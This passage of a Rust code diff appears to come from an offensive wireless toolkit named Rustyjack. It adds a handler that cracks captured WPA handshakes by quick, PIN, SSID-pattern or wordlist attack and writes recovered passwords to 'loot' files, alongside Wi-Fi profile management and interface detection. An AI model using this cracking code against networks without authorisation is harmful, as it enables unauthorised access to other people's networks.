+fn handle_wifi_crack(root: &Path, args: WifiCrackArgs) -> Result<HandlerResult> {
+    use rustyjack_wireless::crack::{generate_ssid_passwords, quick_crack, WpaCracker};
+    use rustyjack_wireless::handshake::HandshakeExport;
+    use std::path::PathBuf;
+
+    log::info!("Starting handshake crack on file: {}", args.file);
+
+    #[derive(serde::Deserialize)]
+    struct HandshakeBundle {
+        ssid: String,
+        handshake: HandshakeExport,
+    }
+
+    let file_path = PathBuf::from(&args.file);
+    if !file_path.exists() {
+        bail!("Handshake file not found: {}", args.file);
+    }
+
+    // Only support JSON handshake exports for cracking
+    if file_path
+        .extension()
+        .and_then(|e| e.to_str())
+        .unwrap_or("")
+        .to_ascii_lowercase()
+        != "json"
+    {
+        bail!("Unsupported handshake format. Use the generated handshake_export_*.json file from a capture.");
+    }
+
+    // Load handshake export bundle (JSON)
+    let bundle: HandshakeBundle = {
+        let data = fs::read(&file_path)
+            .with_context(|| format!("reading handshake export {}", file_path.display()))?;
+        serde_json::from_slice(&data)
+            .with_context(|| format!("parsing handshake export {}", file_path.display()))?
+    };
+
+    let ssid = args.ssid.as_deref().unwrap_or(&bundle.ssid).to_string();
+
+    // Determine crack mode
+    let mode = args.mode.as_str();
+
+    // Prepare loot directory for results (use same folder as the handshake export)
+    let parent_dir = file_path
+        .parent()
+        .map(PathBuf::from)
+        .unwrap_or_else(|| loot_directory(root, LootKind::Wireless));
+    fs::create_dir_all(&parent_dir)?;
+
+    let mut cracker = WpaCracker::new(bundle.handshake.clone(), &ssid);
+    let mut attempts = 0u64;
+    let mut password: Option<String> = None;
+
+    match mode {
+        "quick" => {
+            password = quick_crack(&bundle.handshake, &ssid);
+            attempts = cracker.attempts();
+        }
+        "pins" => match cracker.crack_pins() {
+            Ok(r) => match r {
+                rustyjack_wireless::crack::CrackResult::Found(p) => password = Some(p),
+                rustyjack_wireless::crack::CrackResult::Exhausted { attempts: a }
+                | rustyjack_wireless::crack::CrackResult::Stopped { attempts: a } => attempts = a,
+            },
+            Err(e) => bail!("PIN crack error: {}", e),
+        },
+        "ssid" => {
+            let patterns = generate_ssid_passwords(&ssid);
+            match cracker.crack_passwords(&patterns) {
+                Ok(r) => match r {
+                    rustyjack_wireless::crack::CrackResult::Found(p) => password = Some(p),
+                    rustyjack_wireless::crack::CrackResult::Exhausted { attempts: a }
+                    | rustyjack_wireless::crack::CrackResult::Stopped { attempts: a } => {
+                        attempts = a
+                    }
+                },
+                Err(e) => bail!("SSID-pattern crack error: {}", e),
+            }
+        }
+        "wordlist" => {
+            let wordlist = args
+                .wordlist
+                .as_ref()
+                .ok_or_else(|| anyhow!("wordlist mode requires --wordlist"))?;
+            match cracker.crack_wordlist(PathBuf::from(wordlist).as_path()) {
+                Ok(r) => match r {
+                    rustyjack_wireless::crack::CrackResult::Found(p) => password = Some(p),
+                    rustyjack_wireless::crack::CrackResult::Exhausted { attempts: a }
+                    | rustyjack_wireless::crack::CrackResult::Stopped { attempts: a } => {
+                        attempts = a
+                    }
+                },
+                Err(e) => bail!("Wordlist crack error: {}", e),
+            }
+        }
+        _ => bail!("Unknown crack mode: {}", mode),
+    }
+
+    if attempts == 0 {
+        attempts = cracker.attempts();
+    }
+
+    // Save result if password found
+    let mut loot_path = None;
+    if let Some(ref pwd) = password {
+        let ts = chrono::Local::now().format("%Y%m%d_%H%M%S");
+        let outfile = parent_dir.join(format!("crack_result_{}.txt", ts));
+        let content = format!(
+            "SSID: {}\nFile: {}\nMode: {}\nPassword: {}\nAttempts: {}\n",
+            ssid,
+            file_path.display(),
+            mode,
+            pwd,
+            attempts
+        );
+        fs::write(&outfile, content)
+            .with_context(|| format!("writing crack result {}", outfile.display()))?;
+        loot_path = Some(outfile);
+    }
+
+    let data = json!({
+        "file": args.file,
+        "ssid": ssid,
+        "mode": mode,
+        "wordlist": args.wordlist,
+        "status": if password.is_some() { "found" } else { "exhausted" },
+        "attempts": attempts,
+        "password": password,
+        "loot_path": loot_path.as_ref().map(|p| p.display().to_string()),
+    });
+
+    Ok((
+        if password.is_some() {
+            "Password found".to_string()
+        } else {
+            "Crack attempt finished".to_string()
+        },
+        data,
+    ))
+}
+
+fn handle_wifi_profile_list(root: &Path) -> Result<HandlerResult> {
+    log::info!("Listing WiFi profiles");
+
+    let profiles = match list_wifi_profiles(root) {
+        Ok(p) => {
+            log::info!("Found {} profile(s)", p.len());
+            p
+        }
+        Err(e) => {
+            log::error!("Failed to list WiFi profiles: {e}");
+            bail!("Failed to list WiFi profiles: {e}");
+        }
+    };
+
+    let data = json!({
+        "profiles": profiles,
+        "count": profiles.len(),
+    });
+    Ok(("Wi-Fi profiles loaded".to_string(), data))
+}
+
+fn handle_wifi_profile_save(root: &Path, args: WifiProfileSaveArgs) -> Result<HandlerResult> {
+    let WifiProfileSaveArgs {
+        ssid,
+        password,
+        interface,
+        priority,
+        auto_connect,
+    } = args;
+
+    log::info!("Saving WiFi profile for SSID: {ssid}");
+
+    let profile = WifiProfile {
+        ssid: ssid.clone(),
+        password: Some(password),
+        interface,
+        priority: priority as i32,
+        auto_connect: auto_connect.unwrap_or(true),
+        created: None,
+        last_used: None,
+        notes: None,
+    };
+
+    let path = match save_wifi_profile(root, &profile) {
+        Ok(p) => {
+            log::info!("Profile saved successfully to: {}", p.display());
+            p
+        }
+        Err(e) => {
+            log::error!("Failed to save WiFi profile for {ssid}: {e}");
+            bail!("Failed to save WiFi profile: {e}");
+        }
+    };
+
+    let data = json!({
+        "ssid": ssid,
+        "path": path,
+    });
+    Ok(("Wi-Fi profile saved".to_string(), data))
+}
+
+fn handle_wifi_profile_connect(root: &Path, args: WifiProfileConnectArgs) -> Result<HandlerResult> {
+    log::info!("Attempting WiFi profile connection");
+
+    let interface = match select_wifi_interface(args.interface.clone()) {
+        Ok(iface) => {
+            log::info!("Selected interface: {iface}");
+            iface
+        }
+        Err(e) => {
+            log::error!("Failed to select interface: {e}");
+            bail!("Failed to select interface: {e}");
+        }
+    };
+
+    let stored = if let Some(ref profile_name) = args.profile {
+        log::info!("Loading profile: {profile_name}");
+        match load_wifi_profile(root, profile_name) {
+            Ok(p) => p,
+            Err(e) => {
+                log::error!("Failed to load profile '{profile_name}': {e}");
+                bail!("Failed to load profile: {e}");
+            }
+        }
+    } else if let Some(ref ssid) = args.ssid {
+        log::info!("Loading profile by SSID: {ssid}");
+        match load_wifi_profile(root, ssid) {
+            Ok(p) => p,
+            Err(e) => {
+                log::warn!("Could not load profile for SSID '{ssid}': {e}");
+                None
+            }
+        }
+    } else {
+        None
+    };
+
+    let ssid = args
+        .ssid
+        .clone()
+        .or_else(|| stored.as_ref().map(|p| p.profile.ssid.clone()))
+        .ok_or_else(|| {
+            log::error!("No SSID provided and no profile found");
+            anyhow!("Provide --ssid or --profile when connecting to Wi-Fi")
+        })?;
+
+    let password = args
+        .password
+        .clone()
+        .or_else(|| stored.as_ref().and_then(|p| p.profile.password.clone()));
+
+    log::info!("Connecting to SSID: {ssid} on interface: {interface}");
+
+    if let Err(e) = connect_wifi_network(&interface, &ssid, password.as_deref()) {
+        log::error!("Failed to connect to {ssid}: {e}");
+        bail!("WiFi connection failed: {e}");
+    }
+
+    log::info!("WiFi connection successful");
+
+    let mut remembered = false;
+    if let Some(mut stored_profile) = stored {
+        stored_profile.profile.last_used = Some(Local::now().to_rfc3339());
+        if args.remember {
+            if let Some(pass) = password.clone() {
+                stored_profile.profile.password = Some(pass);
+                log::info!("Updating stored profile with new password");
+            } else {
+                log::warn!("--remember flag set but no password available to store");
+            }
+        }
+        if let Err(e) = write_wifi_profile(&stored_profile.path, &stored_profile.profile) {
+            log::error!("Failed to update profile: {e}");
+        } else {
+            remembered = true;
+            log::info!("Profile updated successfully");
+        }
+    } else if args.remember {
+        if let Some(pass) = password.clone() {
+            let profile = WifiProfile {
+                ssid: ssid.clone(),
+                password: Some(pass),
+                interface: args.interface.clone().unwrap_or_else(|| "auto".to_string()),
+                priority: 1,
+                auto_connect: true,
+                created: None,
+                last_used: None,
+                notes: None,
+            };
+            match save_wifi_profile(root, &profile) {
+                Ok(_) => {
+                    remembered = true;
+                    log::info!("New profile created and saved");
+                }
+                Err(e) => {
+                    log::error!("Failed to save new profile: {e}");
+                }
+            }
+        } else {
+            log::warn!("--remember flag ignored because no password was supplied");
+        }
+    }
+
+    let data = json!({
+        "interface": interface,
+        "ssid": ssid,
+        "remembered": remembered,
+    });
+    Ok(("Wi-Fi connection triggered".to_string(), data))
+}
+
+fn handle_wifi_profile_delete(root: &Path, args: WifiProfileDeleteArgs) -> Result<HandlerResult> {
+    log::info!("Attempting to delete WiFi profile: {}", args.ssid);
+
+    match delete_wifi_profile(root, &args.ssid) {
+        Ok(()) => {
+            log::info!("Profile deleted successfully: {}", args.ssid);
+            let data = json!({ "ssid": args.ssid });
+            Ok(("Wi-Fi profile deleted".to_string(), data))
+        }
+        Err(e) => {
+            log::error!("Failed to delete profile '{}': {e}", args.ssid);
+            bail!("Failed to delete profile: {e}");
+        }
+    }
+}
+
+fn handle_wifi_disconnect(args: WifiDisconnectArgs) -> Result<HandlerResult> {
+    log::info!("Attempting WiFi disconnect");
+
+    let interface = match disconnect_wifi_interface(args.interface.clone()) {
+        Ok(iface) => {
+            log::info!("Successfully disconnected interface: {iface}");
+            iface
+        }
+        Err(e) => {
+            log::error!("Failed to disconnect WiFi: {e}");
+            bail!("WiFi disconnect failed: {e}");
+        }
+    };
+
+    let data = json!({ "interface": interface });
+    Ok(("Wi-Fi interface disconnected".to_string(), data))
+}
+
+fn wireless_tag(ssid: Option<&str>, bssid: Option<&str>, interface: &str) -> String {
+    if let Some(name) = ssid {
+        if !name.trim().is_empty() {
+            return sanitize_label(name);
+        }
+    }
+    if let Some(mac) = bssid {
+        if !mac.trim().is_empty() {
+            return sanitize_label(mac);
+        }
+    }
+    sanitize_label(interface)
+}
+
+fn loot_directory(root: &Path, kind: LootKind) -> PathBuf {
+    match kind {
+        LootKind::Nmap => root.join("loot").join("Nmap"),
+        LootKind::Responder => root.join("Responder").join("logs"),
+        LootKind::Dnsspoof => root.join("DNSSpoof").join("captures"),
+        LootKind::Ethernet => root.join("loot").join("Ethernet"),
+        LootKind::Wireless => root.join("loot").join("Wireless"),
+    }
+}
+
+/// Build a per-network loot directory under loot/Wireless/<safe_name>
+/// Falls back to BSSID, then "Unknown" if nothing provided.
+fn wireless_target_directory(root: &Path, ssid: Option<String>, bssid: Option<String>) -> PathBuf {
+    let make_safe = |s: &str| {
+        let mut out = String::with_capacity(s.len());
+        for ch in s.chars() {
+            if ch.is_ascii_alphanumeric() || ch == '-' || ch == '_' {
+                out.push(ch);
+            } else {
+                out.push('_');
+            }
+        }
+        let trimmed = out.trim_matches('_').to_string();
+        if trimmed.is_empty() {
+            "Unknown".to_string()
+        } else {
+            trimmed
+        }
+    };
+
+    let name = ssid
+        .as_ref()
+        .map(|s| s.as_str())
+        .filter(|s| !s.is_empty())
+        .map(|s| make_safe(s))
+        .or_else(|| {
+            bssid
+                .as_ref()
+                .map(|b| b.as_str())
+                .filter(|b| !b.is_empty())
+                .map(|b| make_safe(b))
+        })
+        .unwrap_or_else(|| "Unknown".to_string());
+
+    root.join("loot").join("Wireless").join(name)
+}
+
+fn loot_kind_label(kind: LootKind) -> &'static str {
+    match kind {
+        LootKind::Nmap => "nmap",
+        LootKind::Responder => "responder",
+        LootKind::Dnsspoof => "dnsspoof",
+        LootKind::Ethernet => "ethernet",
+        LootKind::Wireless => "wireless",
+    }
+}
+
+fn resolve_loot_path(root: &Path, path: &Path) -> Result<PathBuf> {
+    let candidate = if path.is_absolute() {
+        path.to_path_buf()
+    } else {
+        root.join(path)
+    };
+    let canonical = candidate
+        .canonicalize()
+        .with_context(|| format!("resolving {}", path.display()))?;
+    if !canonical.starts_with(root) {
+        bail!("Path {} is outside the Rustyjack root", canonical.display());
+    }
+    Ok(canonical)
+}
+
+fn handle_hardware_detect() -> Result<HandlerResult> {
+    log::info!("Scanning hardware interfaces");
+
+    let interfaces = list_interface_summaries()?;
+
+    // Categorize interfaces
+    let mut ethernet_ports = Vec::new();
+    let mut wifi_modules = Vec::new();
+    let mut other_interfaces = Vec::new();
+
+    for iface in &interfaces {
+        // Skip loopback
+        if iface.name == "lo" {
+            continue;
+        }
+
+        match iface.kind.as_str() {
+            "wireless" => wifi_modules.push(iface.clone()),
+            "wired" => {
+                // Only count ethernet if it's eth* or en*
+                if iface.name.starts_with("eth") || iface.name.starts_with("en") {
+                    ethernet_ports.push(iface.clone());
+                } else {
+                    other_interfaces.push(iface.clone());
+                }
+            }
+            _ => other_interfaces.push(iface.clone()),
+        }
+    }
+
+    let data = json!({
+        "ethernet_count": ethernet_ports.len(),
+        "wifi_count": wifi_modules.len(),
+        "other_count": other_interfaces.len(),
+        "ethernet_ports": ethernet_ports,
+        "wifi_modules": wifi_modules,
+        "other_interfaces": other_interfaces,
+        "total_interfaces": interfaces.len() - 1, // Exclude loopback
+    });
+
+    let summary = format!(
+        "Found {} ethernet, {} wifi, {} other",
+        ethernet_ports.len(),
+        wifi_modules.len(),
+        other_interfaces.len()
+    );
+
+    log::info!("Hardware scan complete: {summary}");
+    Ok((summary, data))
+}
